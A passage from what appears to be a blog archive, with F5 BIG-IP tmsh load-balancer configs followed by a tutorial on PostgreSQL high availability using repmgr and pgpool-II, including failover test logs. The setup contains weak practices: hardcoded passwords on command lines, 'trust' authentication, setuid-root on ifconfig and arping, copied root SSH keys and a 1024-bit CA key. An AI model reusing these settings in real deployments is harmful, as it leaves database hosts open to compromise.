localityName=Brno commonName=cloud.example.com Certificate Authority \" openssl req -x509 -nodes -subj \"$(echo -n \"$SUBJ\" | tr \"\\n\" \"/\")\" -newkey rsa:2048 -keyout /config/ssl/ssl.key/cloud.example.com_self-signed_2014.key -out /config/ssl/ssl.crt/cloud.example.com_self-signed_2014.crt -days 3650 tmsh install /sys crypto key cloud.example.com_self-signed_2014.key from-local-file /config/ssl/ssl.key/cloud.example.com_self-signed_2014.key tmsh install /sys crypto cert cloud.example.com_self-signed_2014.crt from-local-file /config/ssl/ssl.crt/cloud.example.com_self-signed_2014.crt DNS VIP iApp tmsh create sys application service dns-ext-vip1_53 '{ \\ description \"DNS VIP - External - NS1 53\" \\ strict-updates disabled \\ tables add { \\ vs_pool__members { \\ column-names { addr port conn_limit } \\ rows { \\ { row { 10.0.1.10 53 0 } } \\ { row { 10.0.1.20 53 0 } } \\ } \\ } \\ } \\ template f5.dns \\ variables add { \\ app_health__frequency { value 30 } \\ app_health__monitor { value \\\"/#create_new#\\\" } \\ app_health__record_type { value a } \\ app_health__recv { value \\\"\\\" } \\ vs_pool__pool_to_use { value \\\"/#create_new#\\\" } \\ app_health__send { value ns1.cloud.example.com } \\ vs_pool__vs_addr { value 10.0.1.16 } \\ vs_pool__vs_port { value 53 } \\ } \\ }' tmsh modify ltm virtual dns-ext-vip1_53.app/dns-ext-vip1_53_dns_tcp description \"DNS VIP - External - NS1 TCP 53\" tmsh modify ltm virtual dns-ext-vip1_53.app/dns-ext-vip1_53_dns_udp description \"DNS VIP - External - NS1 UDP 53\" tmsh modify ltm pool dns-ext-vip1_53.app/dns-ext-vip1_53_tcp_pool description \"DNS VIP - External - NS1 TCP 53\" members modify '{ 10.0.1.10:domain { description \"Public DNS Master\" } 10.0.1.20:domain { description \"Public DNS Slave\" } }' tmsh modify ltm pool dns-ext-vip1_53.app/dns-ext-vip1_53_udp_pool description \"DNS VIP - External - NS1 UDP 53\" members modify '{ 10.0.1.10:domain { description \"Public DNS Master\" } 10.0.1.20:domain { description \"Public DNS Slave\" } }' tmsh create sys application service dns-ext-vip2_53 '{ \\ description \"DNS VIP - External - NS2 53\" \\ strict-updates disabled \\ tables add { \\ vs_pool__members { \\ column-names { addr port conn_limit } \\ rows { \\ { row { 10.0.1.10 53 0 } } \\ { row { 10.0.1.20 53 0 } } \\ } \\ } \\ } \\ template f5.dns \\ variables add { \\ app_health__frequency { value 30 } \\ app_health__monitor { value \\\"/#create_new#\\\" } \\ app_health__record_type { value a } \\ app_health__recv { value \\\"\\\" } \\ vs_pool__pool_to_use { value \\\"/#create_new#\\\" } \\ app_health__send { value ns2.cloud.example.com } \\ vs_pool__vs_addr { value 10.0.1.17 } \\ vs_pool__vs_port { value 53 } \\ } \\ }' tmsh modify ltm virtual dns-ext-vip2_53.app/dns-ext-vip2_53_dns_tcp description \"DNS VIP - External - NS2 TCP 53\" tmsh modify ltm virtual dns-ext-vip2_53.app/dns-ext-vip2_53_dns_udp description \"DNS VIP - External - NS2 UDP 53\" tmsh modify ltm pool dns-ext-vip2_53.app/dns-ext-vip2_53_tcp_pool description \"DNS VIP - External - NS2 TCP 53\" members modify '{ 10.0.1.10:domain { description \"Public DNS Master\" } 10.0.1.20:domain { description \"Public DNS Slave\" } }' tmsh modify ltm pool dns-ext-vip2_53.app/dns-ext-vip2_53_udp_pool description \"DNS VIP - External - NS2 UDP 53\" members modify '{ 10.0.1.10:domain { description \"Public DNS Master\" } 10.0.1.20:domain { description \"Public DNS Slave\" } }' tmsh modify ltm node 10.0.1.10 description \"Public DNS Master\" tmsh modify ltm node 10.0.1.20 description \"Public DNS Slave\" LDAP VIP iApp tmsh create sys application service ds-vip_389 '{ \\ description \"Directory Server VIP 389\" \\ strict-updates disabled \\ lists add { irules__irules { } } \\ tables add { \\ vs_pool__pool_members { \\ column-names { addr port conn_limit } \\ rows { \\ { row { 10.0.0.150 389 0 } } \\ { row { 10.0.0.151 389 0 } } \\ } \\ } \\ } \\ template f5.ldap \\ variables add { \\ app_health__account { value \"cn=directory manager,o=cloud.example.com\" } \\ app_health__frequency { value 30 } \\ app_health__monitor { value \\\"/#create_new#\\\" } \\ app_health__monitor_password { value my_ldap_password } \\ app_health__search_level { value o=cloud.example.com } \\ app_health__search_query { value dc=test } \\ client_opt__tcp_opt { value \\\"/#lan#\\\" } \\ server_opt__tcp_opt { value \\\"/#lan#\\\" } \\ ssl_encryption_questions__advanced_mode { value yes } \\ vs_pool__bigip_route { value yes } \\ vs_pool__lb_method { value least-connections-member } \\ vs_pool__persistence { value \\\"/#default#\\\" } \\ vs_pool__pool_to_use { value \\\"/#create_new#\\\" } \\ vs_pool__vs_addr { value 10.0.0.203 } \\ vs_pool__vs_port { value 389 } \\ } \\ }' tmsh modify ltm virtual ds-vip_389.app/ds-vip_389_vs description \"Directory Server VIP 389 tcp\" tmsh modify ltm pool ds-vip_389.app/ds-vip_389_pool description \"Directory Server VIP 389\" members modify '{ 10.0.0.150:ldap { description \"Directory server - primary\" } 10.0.0.151:ldap { description \"Directory server - secondary\" } }' tmsh modify ltm node 10.0.0.150 description \"Directory server - primary\" tmsh modify ltm node 10.0.0.151 description \"Directory server - secondary\" HTTPS VIP iApp tmsh create sys application service https-vip_443 '{ \\ description \"HTTPS Server VIP 443\" \\ strict-updates disabled \\ tables add { \\ pool__hosts { \\ column-names { name } \\ rows { { row { config.cloud.example.com } } } \\ } \\ pool__members { \\ column-names { addr port_secure connection_limit } \\ rows { \\ { row { 10.0.1.140 443 0 } } \\ { row { 10.0.1.150 443 0 } } \\ } \\ } \\ } \\ template f5.http \\ variables add { \\ client__http_compression { value \\\"/#create_new#\\\" } \\ monitor__monitor { value \\\"/#create_new#\\\" } \\ monitor__response { value \\\"\\\" } \\ monitor__uri { value / } \\ net__client_mode { value wan } \\ net__server_mode { value lan } \\ pool__addr { value 10.0.1.94 } \\ pool__pool_to_use { value \\\"/#create_new#\\\" } \\ pool__port_secure { value 443 } \\ pool__port { value 443 } \\ ssl__mode { value client_ssl } \\ ssl__server_ssl_profile { value \\\"/#default#\\\" } \\ ssl__cert { value /Common/cloud.example.com_self-signed_2014.crt } \\ ssl__client_ssl_profile { value \\\"/#create_new#\\\" } \\ ssl__key { value /Common/cloud.example.com_self-signed_2014.key } \\ } \\ }' tmsh modify ltm virtual https-vip_443.app/https-vip_443_vs description \"HTTPS Server VIP\" tmsh modify ltm pool https-vip_443.app/https-vip_443_pool description \"HTTPS Server VIP 443\" members modify '{ 10.0.1.140:http { description \"HTTPS Server 01\" } 10.0.1.150:http { description \"HTTPS Server 02\" } }' tmsh modify ltm node 10.0.1.140 description \"HTTPS Server 01\" tmsh modify ltm node 10.0.1.150 description \"HTTPS Server 02\" That’s all. I hope it will save some time." }, { "title": "Loadbalancing of PostgreSQL databases using pgpool-II and repmgr", "url": "/posts/loadbalancing-of-postgresql-databases-using-pgpool-ii-and-repmgr/", "categories": "Linux, Storage, linux.xvx.cz", "tags": "database, load-balancer", "date": "2014-10-25 00:00:00 +0200", "content": "Original post from linux.xvx.cz I had to solve the PostgreSQL HA and Redundancy a few weeks ago. A lot has been written about this topic, but I was not able to find a guide describing pgpool-II and repmgr. After reading some documents I built the solution which I’m going to describe. In short it contains the Master/Slave DB Streaming replication and pgpool load distribution and HA. The replication “part” is managed by repmgr. Here is the network diagram: Master PostgreSQL database installation - cz01-psql01: #PostgreSQL installation yum localinstall -y http://yum.postgresql.org/9.3/redhat/rhel-6-x86_64/pgdg-redhat93-9.3-1.noarch.rpm yum install -y postgresql93-server repmgr yum install -y --enablerepo=centos-base postgresql93-contrib service postgresql-9.3 initdb chkconfig postgresql-9.3 on sed -i.orig \\ -e \"s/^#listen_addresses = 'localhost'/listen_addresses = '*'/\" \\ -e \"s/^#shared_preload_libraries = ''/shared_preload_libraries = 'repmgr_funcs'/\" \\ -e \"s/^#wal_level = minimal/wal_level = hot_standby/\" \\ -e \"s/^#archive_mode = off/archive_mode = on/\" \\ -e \"s@^#archive_command = ''@archive_command = 'cd .'@\" \\ -e \"s/^#max_wal_senders = 0/max_wal_senders = 1/\" \\ -e \"s/^#wal_keep_segments = 0/wal_keep_segments = 5000/\" \\ -e \"s/^#\\(wal_sender_timeout =.*\\)/\\1/\" \\ -e \"s/^#hot_standby = off/hot_standby = on/\" \\ -e \"s/^#log_min_duration_statement = -1/log_min_duration_statement = 0/\" \\ -e \"s/^log_line_prefix = '&lt; %m &gt;'/log_line_prefix = '%t [%p]: [%l-1] user=%u,db=%d '/\" \\ -e \"s/^#log_checkpoints =.*/log_checkpoints = on/\" \\ -e \"s/^#log_connections =.*/log_connections = on/\" \\ -e \"s/^#log_disconnections =.*/log_disconnections = on/\" \\ -e \"s/^#log_lock_waits = off/log_lock_waits = on/\" \\ -e \"s/^#log_statement = 'none'/log_statement = 'all'/\" \\ -e \"s/^#log_temp_files = -1/log_temp_files = 0/\" \\ /var/lib/pgsql/9.3/data/postgresql.conf cat &gt;&gt; /var/lib/pgsql/9.3/data/pg_hba.conf &lt;&lt; EOF host all admin 0.0.0.0/0 md5 host all all 10.32.243.0/24 md5 # cz01-psql01 host repmgr repmgr 10.32.243.147/32 trust host replication repmgr 10.32.243.147/32 trust # cz01-psql02 host repmgr repmgr 10.32.243.148/32 trust host replication repmgr 10.32.243.148/32 trust EOF for SERVER in cz01-psql01 cz01-psql02 cz01-pgpool-ha cz01-pgpool01 cz01-pgpool02; do echo \"$SERVER.example.com:5432:postgres:admin:password123\" &gt;&gt; ~/.pgpass echo \"$SERVER.example.com:5432:repmgr:repmgr:repmgr_password\" &gt;&gt; ~/.pgpass done chmod 0600 ~/.pgpass cp ~/.pgpass /var/lib/pgsql/ #Configure repmgr mkdir /var/lib/pgsql/repmgr cat &gt; /var/lib/pgsql/repmgr/repmgr.conf &lt;&lt; EOF cluster=pgsql_cluster node=1 node_name=cz01-psql01 conninfo='host=cz01-psql01.example.com user=repmgr dbname=repmgr' pg_bindir=/usr/pgsql-9.3/bin/ master_response_timeout=5 reconnect_attempts=2 reconnect_interval=2 failover=manual promote_command='/usr/pgsql-9.3/bin/repmgr standby promote -f /var/lib/pgsql/repmgr/repmgr.conf' follow_command='/usr/pgsql-9.3/bin/repmgr standby follow -f /var/lib/pgsql/repmgr/repmgr.conf' EOF cp -r /root/.ssh /var/lib/pgsql/ chown -R postgres:postgres /var/lib/pgsql/.ssh /var/lib/pgsql/.pgpass /var/lib/pgsql/repmgr echo \"PATH=/usr/pgsql-9.3/bin:$PATH\" &gt;&gt; /var/lib/pgsql/.bash_profile service postgresql-9.3 start #Add users sudo -u postgres psql -c \"CREATE ROLE admin SUPERUSER CREATEDB CREATEROLE INHERIT REPLICATION LOGIN ENCRYPTED PASSWORD 'password123';\" sudo -u postgres psql -c \"CREATE USER repmgr SUPERUSER LOGIN ENCRYPTED PASSWORD 'repmgr_password';\" sudo -u postgres psql -c \"CREATE DATABASE repmgr OWNER repmgr;\" #Register DB instance as master su - postgres -c \"repmgr -f /var/lib/pgsql/repmgr/repmgr.conf --verbose master register\" #Configure SSL Layer for PostgreSQL # shellcheck disable=SC2016 sed -i.orig \\ -e 's@\\$dir/cacert.pem@\\$dir/example.com-ca.crt @' \\ -e 's@\\$dir/crl.pem@\\$dir/example.com-ca.crl @' \\ -e 's@\\$dir/private/cakey.pem@\\$dir/private/example.com-ca.key @' \\ -e 's/^\\(crlnumber\\)/#\\1/' \\ -e 's/= XX/= CZ/' \\ -e 's/^#\\(stateOrProvinceName_default.*\\) Default Province/\\1 Czech Republic/' \\ -e 's/= Default City/= Brno/' \\ -e 's/= Default Company Ltd/= Example, Inc\\./' \\ -e 's/= policy_match/= policy_anything/' \\ -e 's/^#\\(unique_subject\\)/\\1/' /etc/pki/tls/openssl.cnf touch /etc/pki/CA/index.txt echo 01 &gt; /etc/pki/CA/serial cd /etc/pki/CA || exit # Private key for CA ( umask 077 openssl genrsa -passout pass:password123 -out private/example.com-ca.key 1024 openssl pkey -text -passout pass:password123 -in private/example.com-ca.key &gt; private/example.com-ca.key.info ) SUBJ=\" C=CZ ST=Czech Republic O=Example, Inc. localityName=Brno commonName=example.com Certificate Authority \" openssl req -passin pass:password123 -subj \"$(echo -n \"$SUBJ\" | tr \"\\n\" \"/\")\" -new -x509 -key private/example.com-ca.key -days 3650 -out example.com-ca.crt openssl x509 -noout -text -in example.com-ca.crt &gt; example.com-ca.crt.info # cz01-psql01 Certificate openssl genrsa -passout pass:password123 -des3 -out cz01-psql01.example.com_priv_encrypted.key 2048 openssl rsa -passin pass:password123 -in cz01-psql01.example.com_priv_encrypted.key -out cz01-psql01.example.com_priv.key SUBJ=\" C=CZ ST=Czech Republic O=Example OU=Deployment L=Brno CN=cz01-psql01.example.com emailAddress=root@example.com \" openssl req -passin pass:password123 -new -subj \"$(echo -n \"$SUBJ\" | tr \"\\n\" \"/\")\" -days 3650 -key cz01-psql01.example.com_priv_encrypted.key -out cz01-psql01.example.com.csr openssl ca -passin pass:password123 -batch -in cz01-psql01.example.com.csr -out cz01-psql01.example.com.crt openssl x509 -noout -text -in cz01-psql01.example.com.crt &gt; cz01-psql01.example.com.crt.info cp /etc/pki/CA/cz01-psql01.example.com.crt /var/lib/pgsql/9.3/server.crt cp /etc/pki/CA/cz01-psql01.example.com_priv.key /var/lib/pgsql/9.3/server.key chown postgres:postgres /var/lib/pgsql/9.3/server.* chmod 0600 /var/lib/pgsql/9.3/server.key sed -i \\ -e \"s/#ssl = off/ssl = on/\" \\ -e \"s@#ssl_cert_file = 'server.crt'@ssl_cert_file = '../server.crt'@\" \\ -e \"s@#ssl_key_file = 'server.key'@ssl_key_file = '../server.key'@\" \\ /var/lib/pgsql/9.3/data/postgresql.conf service postgresql-9.3 restart # Quick Test export PGSSLMODE=require psql --host cz01-psql01.example.com --username=fuzeme --dbname=fuzers -w -l Slave PostgreSQL database installation - cz01-psql02: #PostgreSQL installation yum localinstall -y http://yum.postgresql.org/9.3/redhat/rhel-6-x86_64/pgdg-redhat93-9.3-1.noarch.rpm yum install -y postgresql93-server repmgr yum install -y --enablerepo=centos-base postgresql93-contrib chkconfig postgresql-9.3 on echo \"PATH=/usr/pgsql-9.3/bin:$PATH\" &gt;&gt; /var/lib/pgsql/.bash_profile scp -r cz01-psql01.example.com:/root/{.pgpass,.ssh} /root/ cp -r /root/{.pgpass,.ssh} /var/lib/pgsql/ chown -R postgres:postgres /var/lib/pgsql/.pgpass /var/lib/pgsql/.ssh #Check the connection to primary node su - postgres -c \"psql --username=repmgr --dbname=repmgr --host cz01-psql01.example.com -w -l\" #Replicate the DB from the master mode su - postgres -c \"repmgr -D /var/lib/pgsql/9.3/data -d repmgr -p 5432 -U repmgr -R postgres --verbose standby clone cz01-psql01.example.com\" #Configure the repmgr mkdir /var/lib/pgsql/repmgr cat &gt; /var/lib/pgsql/repmgr/repmgr.conf &lt;&lt; EOF cluster=pgsql_cluster node=2 node_name=cz01-psql02 conninfo='host=cz01-psql02.example.com user=repmgr dbname=repmgr' pg_bindir=/usr/pgsql-9.3/bin/ master_response_timeout=5 reconnect_attempts=2 reconnect_interval=2 failover=manual promote_command='/usr/pgsql-9.3/bin/repmgr standby promote -f /var/lib/pgsql/repmgr/repmgr.conf' follow_command='/usr/pgsql-9.3/bin/repmgr standby follow -f /var/lib/pgsql/repmgr/repmgr.conf' EOF chown -R postgres:postgres /var/lib/pgsql/repmgr # cz01-psql02 Certificate cd /etc/pki/CA || exit openssl genrsa -passout pass:password123 -des3 -out cz01-psql02.example.com_priv_encrypted.key 2048 openssl rsa -passin pass:password123 -in cz01-psql02.example.com_priv_encrypted.key -out cz01-psql02.example.com_priv.key SUBJ=\" C=CZ ST=Czech Republic O=Example OU=Deployment L=Brno CN=cz01-psql02.example.com emailAddress=root@example.com \" openssl req -passin pass:password123 -new -subj \"$(echo -n \"$SUBJ\" | tr \"\\n\" \"/\")\" -days 3650 -key cz01-psql02.example.com_priv_encrypted.key -out cz01-psql02.example.com.csr scp /etc/pki/CA/cz01-psql02.example.com.csr root@cz01-psql01.example.com:/etc/pki/CA/ ssh root@cz01-psql01.example.com &lt;&lt; EOF cd /etc/pki/CA openssl ca -passin pass:password123 -batch -in cz01-psql02.example.com.csr -out cz01-psql02.example.com.crt openssl x509 -noout -text -in cz01-psql02.example.com.crt &gt; cz01-psql02.example.com.crt.info EOF scp root@cz01-psql01.example.com:/etc/pki/CA/cz01-psql02.example.com.crt /etc/pki/CA/ cp /etc/pki/CA/cz01-psql02.example.com.crt /var/lib/pgsql/9.3/server.crt cp /etc/pki/CA/cz01-psql02.example.com_priv.key /var/lib/pgsql/9.3/server.key chown postgres:postgres /var/lib/pgsql/9.3/server.* chmod 0600 /var/lib/pgsql/9.3/server.key service postgresql-9.3 start #Register the DB instance as slave su - postgres -c \"repmgr -f /var/lib/pgsql/repmgr/repmgr.conf --verbose standby register\" pgpool server installation (common for primary/secondary node) - cz01-pgpool0{1,2}: #pgpool installation yum localinstall -y http://yum.postgresql.org/9.3/redhat/rhel-6-x86_64/pgdg-redhat93-9.3-1.noarch.rpm yum install -y pgpool-II-93 postgresql93 scp -r cz01-psql01.example.com:/root/{.ssh,.pgpass} /root/ scp cz01-psql01.example.com:/root/.pgpass /root/ cp /etc/pgpool-II-93/pcp.conf.sample /etc/pgpool-II-93/pcp.conf echo \"admin:$(pg_md5 password123)\" &gt;&gt; /etc/pgpool-II-93/pcp.conf sed \\ -e \"s/^listen_addresses = .localhost./listen_addresses = '*'/\" \\ -e \"s/^log_destination = .stderr./log_destination = 'syslog'/\" \\ -e \"s/^port = .*/port = 5432/\" \\ -e \"s/^backend_hostname0 =.*/backend_hostname0 = 'cz01-psql01.example.com'/\" \\ -e \"s/^#backend_flag0/backend_flag0/\" \\ -e \"s/^#backend_hostname1 =.*/backend_hostname1 = 'cz01-psql02.example.com'/\" \\ -e \"s/^#backend_port1 = 5433/backend_port1 = 5432/\" \\ -e \"s/^#backend_weight1/backend_weight1/\" \\ -e \"s/^#backend_data_directory1 =.*/backend_data_directory1 = '\\/var\\/lib\\/pgsql\\/9.3\\/data'/\" \\ -e \"s/^#backend_flag1/backend_flag1/\" \\ -e \"s/^log_hostname =.*/log_hostname = on/\" \\ -e \"s/^syslog_facility =.*/syslog_facility = 'daemon.info'/\" \\ -e \"s/^sr_check_user =.*/sr_check_user = 'admin'/\" \\ -e \"s/^sr_check_password =.*/sr_check_password = 'password123'/\" \\ -e \"s/^health_check_period =.*/health_check_period = 10/\" \\ -e \"s/^health_check_user =.*/health_check_user = 'admin'/\" \\ -e \"s/^health_check_password =.*/health_check_password = 'password123'/\" \\ -e \"s/^use_watchdog =.*/use_watchdog = on/\" \\ -e \"s/^delegate_IP =.*/delegate_IP = '10.32.243.250'/\" \\ -e \"s/^netmask 255.255.255.0/netmask 255.255.255.128/\" \\ -e \"s/^heartbeat_device0 =.*/heartbeat_device0 = 'eth0'/\" \\ -e \"s/^#other_pgpool_port0 =.*/other_pgpool_port0 = 5432/\" \\ -e \"s/^#other_wd_port0 = 9000/other_wd_port0 = 9000/\" \\ -e \"s/^load_balance_mode = off/load_balance_mode = on/\" \\ -e \"s/^master_slave_mode = off/master_slave_mode = on/\" \\ -e \"s/^master_slave_sub_mode =.*/master_slave_sub_mode = 'stream'/\" \\ -e \"s@^failover_command = ''@failover_command = '/etc/pgpool-II-93/failover_stream.sh %d %H'@\" \\ -e \"s/^recovery_user = 'nobody'/recovery_user = 'admin'/\" \\ -e \"s/^recovery_password = ''/recovery_password = 'password123'/\" \\ -e \"s/^recovery_1st_stage_command = ''/recovery_1st_stage_command = 'basebackup.sh'/\" \\ -e \"s/^sr_check_period = 0/sr_check_period = 10/\" \\ -e \"s/^delay_threshold = 0/delay_threshold = 10000000/\" \\ -e \"s/^log_connections = off/log_connections = on/\" \\ -e \"s/^log_statement = off/log_statement = on/\" \\ -e \"s/^log_per_node_statement = off/log_per_node_statement = on/\" \\ -e \"s/^log_standby_delay = 'none'/log_standby_delay = 'always'/\" \\ -e \"s/^enable_pool_hba = off/enable_pool_hba = on/\" \\ /etc/pgpool-II-93/pgpool.conf.sample &gt; /etc/pgpool-II-93/pgpool.conf cat &gt; /etc/pgpool-II-93/failover_stream.sh &lt;&lt; \\EOF #!/bin/sh # Failover command for streaming replication. # # Arguments: $1: failed node id. $2: new master hostname. failed_node=$1 new_master=$2 ( date echo \"Failed node: $failed_node\" set -x # Promote standby/slave to be a new master (old master failed) /usr/bin/ssh -T -l postgres $new_master \"/usr/pgsql-9.3/bin/repmgr -f /var/lib/pgsql/repmgr/repmgr.conf standby promote 2&gt;/dev/null 1&gt;/dev/null &lt;&amp;-\" exit 0; ) 2&gt;&amp;1 | tee -a /tmp/failover_stream.sh.log EOF chmod 755 /etc/pgpool-II-93/failover_stream.sh cp /etc/pgpool-II-93/pool_hba.conf.sample /etc/pgpool-II-93/pool_hba.conf echo \"host all all 0.0.0.0/0 md5\" &gt;&gt; /etc/pgpool-II-93/pool_hba.conf mkdir -p /var/lib/pgsql/9.3/data groupadd -g 26 -o -r postgres useradd -M -n -g postgres -o -r -d /var/lib/pgsql -s /bin/bash -c \"PostgreSQL Server\" -u 26 postgres cp -R /root/.ssh /var/lib/pgsql/ sed -i '/^User /d' /var/lib/pgsql/.ssh/config pg_md5 -m -u admin password123 chown -R postgres:postgres /var/lib/pgsql /etc/pgpool-II-93/pool_passwd chmod 6755 /sbin/ifconfig chmod 6755 /sbin/arping chkconfig pgpool-II-93 on Primary pgpool server installation - cz01-pgpool01: sed \\ -e \"s/^wd_hostname =.*/wd_hostname = 'cz01-pgpool01.example.com'/\" \\ -e \"s/^heartbeat_destination0 =.*/heartbeat_destination0 = 'cz01-pgpool02.example.com'/\" \\ -e \"s/^#other_pgpool_hostname0 =.*/other_pgpool_hostname0 = 'cz01-pgpool02.example.com'/\" \\ -i /etc/pgpool-II-93/pgpool.conf service pgpool-II-93 start Secondary pgpool server installation - cz01-pgpool02: sed \\ -e \"s/^wd_hostname =.*/wd_hostname = 'cz01-pgpool02.example.com'/\" \\ -e \"s/^heartbeat_destination0 =.*/heartbeat_destination0 = 'cz01-pgpool01.example.com'/\" \\ -e \"s/^#other_pgpool_hostname0 =.*/other_pgpool_hostname0 = 'cz01-pgpool01.example.com'/\" \\ -i /etc/pgpool-II-93/pgpool.conf service pgpool-II-93 start Now the all 4 server should be configured according the picture mentioned above. To be sure everything is working properly I decided to do various tests by stopping/starting the databases to see how all components are ready for outages. In the next pare there will be a lot of outputs of logs+commands which can be handy for troubleshooting in the future and which will test the proper configuration. All the files modified and used for the configuration above can be found in the postgresql_pgpool_repmgr repository. Testing Check the cluster status cz01-pgpool02 ~ # ssh postgres@cz01-psql02.example.com \"/usr/pgsql-9.3/bin/repmgr --verbose -f /var/lib/pgsql/repmgr/repmgr.conf cluster show\" Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. [2014-10-23 14:39:40] [INFO] repmgr connecting to database Opening configuration file: /var/lib/pgsql/repmgr/repmgr.conf Role | Connection String * master | host=cz01-psql01.example.com user=repmgr dbname=repmgr standby | host=cz01-psql02.example.com user=repmgr dbname=repmgr cz01-pgpool02 ~ # pcp_node_count 1 localhost 9898 admin password123 2 cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 0 cz01-psql01.example.com 5432 1 0.500000 cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 1 cz01-psql02.example.com 5432 1 0.500000 Check if the replication is working cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -c \"create database mydb\" CREATE DATABASE cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -l | grep mydb mydb | admin | UTF8 | en_US.UTF-8 | en_US.UTF-8 | cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-psql01.example.com -w -l | grep mydb mydb | admin | UTF8 | en_US.UTF-8 | en_US.UTF-8 | cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-psql02.example.com -w -l | grep mydb mydb | admin | UTF8 | en_US.UTF-8 | en_US.UTF-8 | Check what is the primary pgpool (it has 2 IPs) cz01-pgpool02 ~ # ssh -q cz01-pgpool01 \"ip a s\" 1: lo: mtu 16436 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo 2: eth0: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:50:56:91:0a:86 brd ff:ff:ff:ff:ff:ff inet 10.32.243.157/25 brd 10.32.243.255 scope global eth0 inet 10.32.243.250/24 brd 10.32.243.255 scope global eth0:0 Stop the Master DB cz01-pgpool02 ~ # date &amp;&amp; ssh root@cz01-psql01.example.com \"service postgresql-9.3 stop\" Thu Oct 23 14:43:09 CEST 2014 Warning: Permanently added 'cz01-psql01.example.com,10.32.243.147' (RSA) to the list of known hosts. Stopping postgresql-9.3 service: [ OK ] The pgpool is monitoring both master and slave databases if they are responding. If one of them is not responding the pgpool executes the failover_stream.sh file. This script is responsible for promoting the slave to be a new master. The result is that the read-only slave will become read/write master. In the diagram below I used the red colour to see the changes which were done when slave was promoted to master. pgpool01 logs right after the master was stopped cz01-pgpool01 ~ # cat /var/log/local0 ... 2014-10-23T14:43:11.547651+02:00 cz01-pgpool01 pgpool[23301]: connect_inet_domain_socket: getsockopt() detected error: Connection refused 2014-10-23T14:43:11.547678+02:00 cz01-pgpool01 pgpool[23301]: make_persistent_db_connection: connection to cz01-psql01.example.com(5432) failed 2014-10-23T14:43:11.562642+02:00 cz01-pgpool01 pgpool[23301]: check_replication_time_lag: could not connect to DB node 0, check sr_check_user and sr_check_password 2014-10-23T14:43:12.327080+02:00 cz01-pgpool01 pgpool[23257]: connect_inet_domain_socket: getsockopt() detected error: Connection refused 2014-10-23T14:43:12.327127+02:00 cz01-pgpool01 pgpool[23257]: make_persistent_db_connection: connection to cz01-psql01.example.com(5432) failed 2014-10-23T14:43:12.332564+02:00 cz01-pgpool01 pgpool[23257]: connect_inet_domain_socket: getsockopt() detected error: Connection refused 2014-10-23T14:43:12.332661+02:00 cz01-pgpool01 pgpool[23257]: make_persistent_db_connection: connection to cz01-psql01.example.com(5432) failed 2014-10-23T14:43:12.332740+02:00 cz01-pgpool01 pgpool[23257]: health check failed. 0 th host cz01-psql01.example.com at port 5432 is down 2014-10-23T14:43:12.332822+02:00 cz01-pgpool01 pgpool[23257]: set 0 th backend down status 2014-10-23T14:43:12.332920+02:00 cz01-pgpool01 pgpool[23257]: wd_start_interlock: start interlocking 2014-10-23T14:43:12.348543+02:00 cz01-pgpool01 pgpool[23257]: wd_assume_lock_holder: become a new lock holder 2014-10-23T14:43:12.372682+02:00 cz01-pgpool01 pgpool[23264]: wd_send_response: WD_STAND_FOR_LOCK_HOLDER received but lock holder exists already 2014-10-23T14:43:13.369470+02:00 cz01-pgpool01 pgpool[23257]: starting degeneration. shutdown host cz01-psql01.example.com(5432) 2014-10-23T14:43:13.369521+02:00 cz01-pgpool01 pgpool[23257]: Restart all children 2014-10-23T14:43:13.369544+02:00 cz01-pgpool01 pgpool[23257]: execute command: /etc/pgpool-II-93/failover_stream.sh 0 cz01-psql02.example.com 2014-10-23T14:43:15.916452+02:00 cz01-pgpool01 pgpool[23257]: find_primary_node_repeatedly: waiting for finding a primary node 2014-10-23T14:43:15.933033+02:00 cz01-pgpool01 pgpool[23257]: find_primary_node: primary node id is 1 2014-10-23T14:43:15.937969+02:00 cz01-pgpool01 pgpool[23257]: wd_end_interlock: end interlocking 2014-10-23T14:43:16.963481+02:00 cz01-pgpool01 pgpool[23257]: failover: set new primary node: 1 2014-10-23T14:43:16.963534+02:00 cz01-pgpool01 pgpool[23257]: failover: set new master node: 1 2014-10-23T14:43:17.051441+02:00 cz01-pgpool01 pgpool[23301]: worker process received restart request 2014-10-23T14:43:17.055720+02:00 cz01-pgpool01 pgpool[23257]: failover done. shutdown host cz01-psql01.example.com(5432) 2014-10-23T14:43:18.059487+02:00 cz01-pgpool01 pgpool[23300]: pcp child process received restart request 2014-10-23T14:43:18.064463+02:00 cz01-pgpool01 pgpool[23257]: PCP child 23300 exits with status 256 in failover() 2014-10-23T14:43:18.064493+02:00 cz01-pgpool01 pgpool[23257]: fork a new PCP child pid 26164 in failover() 2014-10-23T14:43:18.064499+02:00 cz01-pgpool01 pgpool[23257]: worker child 23301 exits with status 256 2014-10-23T14:43:18.065907+02:00 cz01-pgpool01 pgpool[23257]: fork a new worker child pid 26165 psql01 (masted db) logs right after the master was stopped cz01-psql01 / # cat /var/lib/pgsql/9.3/data/pg_log/postgresql-Thu.log ... 2014-10-23 14:43:10 CEST [18254]: [6-1] user=,db= LOG: received fast shutdown request 2014-10-23 14:43:10 CEST [18254]: [7-1] user=,db= LOG: aborting any active transactions 2014-10-23 14:43:10 CEST [24392]: [13-1] user=admin,db=postgres FATAL: terminating connection due to administrator command 2014-10-23 14:43:10 CEST [24392]: [14-1] user=admin,db=postgres LOG: disconnection: session time: 0:03:01.366 user=admin database=postgres host=10.32.243.157 port=53814 2014-10-23 14:43:10 CEST [24386]: [13-1] user=admin,db=postgres FATAL: terminating connection due to administrator command 2014-10-23 14:43:10 CEST [24386]: [14-1] user=admin,db=postgres LOG: disconnection: session time: 0:03:08.732 user=admin database=postgres host=10.32.243.157 port=53812 2014-10-23 14:43:10 CEST [18266]: [2-1] user=,db= LOG: autovacuum launcher shutting down 2014-10-23 14:43:10 CEST [18263]: [27-1] user=,db= LOG: shutting down 2014-10-23 14:43:10 CEST [18263]: [28-1] user=,db= LOG: checkpoint starting: shutdown immediate 2014-10-23 14:43:10 CEST [18263]: [29-1] 